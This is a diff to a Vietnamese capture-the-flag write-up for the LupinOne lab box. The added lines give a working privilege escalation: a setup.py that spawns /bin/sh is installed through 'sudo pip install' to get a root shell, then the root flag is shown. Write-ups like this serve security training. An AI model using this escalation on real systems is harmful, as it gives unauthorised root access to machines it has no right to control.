@@ -137,4 +137,15 @@ Xem 1 vài file trên home của arsene
 User arsene có quyền root thực thi file /usr/bin/pip
 ![image](https://user-images.githubusercontent.com/97771705/222385595-4529dc20-92f1-4ac3-8a53-97dbf18e2b5c.png)
 
+Thực thi 3 lệnh sau
+```
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+```
+![image](https://user-images.githubusercontent.com/97771705/222388785-008e7b0d-f9db-4e0a-a264-252e2c3c550c.png)
+![image](https://user-images.githubusercontent.com/97771705/222388841-cd4fd85f-eb76-4f24-a07c-f66b3d6e45a0.png)
+
+>3mp!r3{congratulations_you_message_to_pwn_the_lupin1_box}
+
 
